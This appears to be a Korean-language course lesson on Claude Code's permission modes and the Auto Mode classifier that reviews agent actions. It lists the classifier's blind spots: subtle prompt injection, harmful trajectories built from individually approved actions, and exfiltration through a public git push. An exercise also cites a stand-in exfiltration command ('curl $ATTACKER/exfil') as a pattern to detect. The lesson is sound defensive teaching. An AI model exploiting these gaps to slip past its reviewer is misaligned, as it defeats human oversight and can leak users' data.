# 자율 에이전트를 위한 권한 모드 (Permission Modes for Autonomous Agents)

> 권한 사다리, 즉 모든 액션을 검토하는 단계에서 전부 승인하는 단계까지 자율성의 수준을 층층이 나눈 구조가, 하네스(harness)가 자율 에이전트에게 묻지 않고 허용할 범위를 규율하는 방법이다. 이 레슨의 실제 예인 Claude Code는 그런 모드를 여섯 가지 노출한다. "plan"은 모든 액션 전에 묻고, "default"(UI에서는 "Manual"로 표시된다)는 위험한 것만 묻고, "acceptEdits"는 파일 쓰기를 자동 승인하되 셸 실행은 여전히 확인하며, "bypassPermissions"는 모든 것을 승인한다. Auto Mode, 즉 `auto` 권한 모드는 액션별 승인을 별도의 분류기(classifier) 모델로 대체한다. 그 모델이 액션마다 실행 전에 검토해서, 요청한 범위를 넘어서는 것은 막는다. 액션 예산은 `max_turns`와 `max_budget_usd`로 강제된다. `auto`를 쓸 수 있는지는 요금제와 조직의 활성화 여부, 모델, 공급자에 따라 달라진다. 그리고 Anthropic은 분류기만으로는 충분하지 않다고 분명히 밝혔다.

**Type:** Learn
**Languages:** Python (stdlib, two-stage classifier simulator)
**Prerequisites:** Phase 15 · 01 (Long-horizon agents), Phase 15 · 09 (Coding-agent landscape)
**Time:** ~45분

## 문제 (The Problem)

내 머신에서 도는 자율 코딩 에이전트(agent)는 별개의 보안 범주다. 공격 표면(attack surface)은 에이전트가 도달할 수 있는 모든 것, 즉 파일 시스템, 네트워크, 자격 증명(credentials), 클립보드, 모든 브라우저 탭, 모든 열린 터미널이다. Bruce Schneier 등이 이를 공개적으로 지적했다. 컴퓨터 사용(computer-use) 에이전트는 챗봇의 "기능 업데이트"가 아니라, 새로운 위험 프로파일을 지닌 새로운 종류의 도구다.

Claude Code의 권한 시스템은 Anthropic의 답이다. "자율 / 비자율"이라는 하나의 스위치가 아니라, 능력 사다리를 가로지르는 여섯 가지 모드가 있다: plan → default → acceptEdits → … → bypassPermissions. 각 모드는 속도와 액션당 검토 사이에서 서로 다른 트레이드오프(trade-off)를 택한다. Auto Mode(2026년 3월)는 별도의 분류기 모델을 추가해서, 승인을 사용자의 임계 경로(critical path)에서 빼낸다. 그 모델은 액션마다 실행 전에 검토하고, 요청한 범위를 넘어서는 것은 막는다.

엔지니어링 질문: 이 시스템은 무엇을 잡고, 무엇을 놓치며, 주어진 과제는 실제로 어느 모드를 요구하는가?

## 개념 (The Concept)

### 여섯 가지 권한 모드

| 모드 | 동작 | 사용 시점 |
|---|---|---|
| `plan` | 에이전트가 계획을 제안하고; 사용자가 전체 계획을 승인하며; 모든 액션이 실행 전에 검토됨 | 익숙하지 않은 과제; 프로덕션 인접 코드; 어떤 저장소에서 에이전트를 처음 쓸 때 |
| `default` | UI에서는 "Manual"로 표시된다. 에이전트가 액션을 실행하되; "위험한" 액션(셸 실행, 파괴적 연산, 네트워크 호출)에 대해 사용자에게 프롬프트 | 대부분의 대화형 코딩 세션 |
| `acceptEdits` | 파일 쓰기는 자동 승인; 셸 실행과 네트워크 호출은 여전히 프롬프트 | 여러 파일에 걸친 리팩터링 패스 |
| `auto` | 별도의 분류기 모델이 액션마다 실행 전에 검토하고, 요청한 범위를 넘어서는 것은 막는다 | 제약된 작업 공간에서의 장기 지평(long-horizon) 무인 실행 |
| `dontAsk` | 절대 묻지 않는다. 권한 규칙으로 미리 허가되지 않은 액션은 거부한다 | 일시적 샌드박스, CI 작업, 연구 스크립트 |
| `bypassPermissions` | 모든 것을 승인 | "버려도 좋은 일시적 컨테이너 안에서만"으로 문서화됨 |

(위 이름들은 공개된 Claude Code 문서와 일치한다. UI는 `default`를 "Manual"로 표시한다.)

### Auto Mode 한 페이지로

Auto Mode(2026년 3월 24일 출시)는 액션별 승인을 모델에 위임하는 최초의 권한 모드다. 구조:

1. **별도의 분류기 모델.** 제안된 모든 액션을, 선언된 과제와 세션의 현재 상태에 비추어 실행 전에 검토하고, 요청한 범위를 넘어서는 것은 막는다. 막힌 액션은 사용자에게 넘어간다.
2. **제공 여부가 갈린다.** `auto`를 아예 쓸 수 있는지부터가 요금제와 조직의 활성화 여부, 모델, 공급자에 달려 있다.

예산 통제는 분류기 옆에 자리한다:

- `max_turns`: 한 세션 내 총 반복 횟수.
- `max_budget_usd`: 세션을 중단시키는 달러 상한.
- 도구별 액션 횟수 제한(예: `WebFetch` 호출 N회 이하 등).

### 시스템이 잡는 것

- 주입된 명령이 알려진 위험 액션 형태에 매핑되는, 도구 입력으로의 직접적 프롬프트 주입(prompt injection).
- 반복적 도구 루프: 분류기는 액션 N+1이 액션 N과 거의 동일함을, 다섯 번 연속으로 볼 수 있다.
- 다른 면에서는 파일 편집만 하는 세션에서 명백히 범위 밖인 셸 명령.

### 시스템이 놓칠 수 있는 것

- **미묘한 프롬프트 주입.** 단 하나의 플래그된 액션도 만들지 않으면서 동작을 변조하는 경우다. 간접 프롬프트 주입은 완전히 패치할 수 있는 취약점이 아니다(OpenAI 대비 책임자, 2025년, 브라우저 에이전트에 관해. Lesson 11 참고).
- **의미 수준의 오작동.** 모든 개별 액션이 안전해 보이는 와중에 합성된 궤적(trajectory)은 해로울 수 있다. 분류기는 액션을 판단할 뿐, 사용자의 의도를 다시 끌어내지는 않는다.
- **합법적 채널을 통한 유출(Exfiltration).** 소유한 파일에 데이터를 쓴 다음 공개 저장소로 `git push`하는 것은, 합성 자체가 문제인 허용된 액션들의 연쇄다.

### 리서치 프리뷰 프레이밍

Anthropic은 Auto Mode를 리서치 프리뷰로 출시했다. 문서는 분류기가 해결책이 아니라 하나의 층임을 명시한다. 사용자는 Auto Mode를 예산, 허용 목록, 격리된 작업 공간, 궤적 감사(trajectory audit)와 결합해 쓰도록 기대된다(Lesson 12~16). 프리뷰 프레이밍은 문서화된 평가-대-배포 격차(Lesson 1)도 반영한다. 오프라인 평가를 통과하는 분류기가, 사용자 맥락이 모호한 실제 세션에서는 다르게 행동하기도 한다.

### 이 사다리가 당신의 워크플로 어디에 자리하는가

- 익숙하지 않은 과제: `plan`에서 시작하라. 계획을 읽는 것이 나쁜 실행을 롤백하는 것보다 싸다.
- 알려진 리팩터: `acceptEdits`는 많은 확인 클릭을 아낀다.
- 무인 백그라운드 실행: 폭발 반경(blast radius)을 측정한 작업 공간 안에서만 `auto`(자격 증명 없음, 프로덕션 마운트 없음, 동의하지 않은 송신 경로 없음).
- 일시적 컨테이너: 컨테이너와 그 자격 증명이 폐기 가능할 때에만 `dontAsk` / `bypassPermissions`가 허용된다.

```figure
autonomy-oversight
```

## 라이브러리로 써보기 (Use It)

`code/main.py`는 액션 검토 분류기를 2단계 파이프라인으로 시뮬레이션한다. 이것은 가르치기 위해 단순화한 것이다. 실제 `auto` 모드는 별도의 분류기 모델이 뒷받침하며, 2단계 계약이 문서로 정해져 있는 것은 아니다. 1단계는 제안된 액션에 대한 저렴한 키워드 규칙이고, 2단계는 더 느린 다중 규칙 검토자다. 드라이버는 짧은 합성 궤적(안전한 액션들, 프롬프트 주입 시도, 반복적 루프)을 입력으로 넣고, 분류기가 잡는 곳과 놓치는 곳을 보여준다.

## 산출물 (Ship It)

`outputs/skill-permission-mode-picker.md`는 과제 설명을 올바른 권한 모드, 예산 상한, 필요한 격리에 매칭한다.

## 연습 문제 (Exercises)

1. `code/main.py`를 실행하라. 어떤 합성 액션 유형이 1단계에서는 결코 플래그되지 않지만 2단계에서는 항상 잡히는가? 어느 것이 둘 다에서 잡히지 않는가?

2. 1단계 규칙 집합을 확장하여 특정한 알려진-나쁜 형태(예: `curl $ATTACKER/exfil`)를 잡아라. 양성(benign) 액션 샘플에서 거짓 양성률(false-positive rate)을 측정하라.

3. Anthropic의 "How the agent loop works" 문서를 읽어라. `default` 모드에서 에이전트가 기본적으로 건드리는 모든 외부 상태를 나열하라. `auto`를 무인으로 돌리기 전에 따로 게이팅해야 할 것은 무엇인가?

4. 24시간 무인 실행 예산을 설계하라: `max_turns`, `max_budget_usd`, 도구별 상한, 허용 목록. 각 숫자를 정당화하라.

5. 모든 개별 액션이 분류기의 승인을 받지만 합성된 동작은 정렬에서 벗어난(misaligned) 궤적 하나를 기술하라. (Lesson 14가 킬 스위치(kill switch)와 카나리아 토큰(canary token)이 이를 어떻게 다루는지 설명한다.)

## 핵심 용어 (Key Terms)

| 용어 | 흔히 하는 말 | 실제 의미 |
|---|---|---|
| 권한 모드 (Permission mode) | "에이전트가 얼마나 할 수 있는가" | 액션별 승인을 통제하는 여섯 개 명명된 정책 중 하나 |
| plan 모드 | "무엇이든 하기 전에 묻기" | 에이전트가 계획을 쓰고; 사용자가 실행 전에 승인 |
| acceptEdits | "파일을 쓰게 두기" | 파일 쓰기는 자동 승인; 셸 실행은 여전히 프롬프트 |
| auto | "자동 승인" | 별도의 분류기 모델이 액션마다 검토하고, 요청 범위를 넘어서는 것을 막는다 |
| bypassPermissions | "완전 YOLO" | 모든 것을 승인; 일시적 컨테이너를 위해 의도됨 |
| 1단계 (시뮬레이터) | "빠른 키워드 검사" | `code/main.py`에서 제안된 액션에 거는 값싼 규칙 |
| 2단계 (시뮬레이터) | "심층 검토" | `code/main.py`에서 플래그된 액션을 다루는 더 느린 다중 규칙 검토자 |
| 리서치 프리뷰 (Research preview) | "정식 출시 아님" | 실패 양상이 아직 매핑 중인 기능에 대한 Anthropic의 프레이밍 |

## 더 읽을거리 (Further Reading)

- [Anthropic: How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) 권한 모드, 예산, 액션 형식.
- [Anthropic: Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) 관리형 서비스 실행 모델.
- [Anthropic: Claude Code product page](https://www.anthropic.com/product/claude-code) 기능 표면과 Auto Mode 발표.
- [Anthropic: Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) 분류기 판단을 형성하는 이유 기반 층.
- [Anthropic: Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) 장기 지평 권한 설계에 대한 내부 관점.
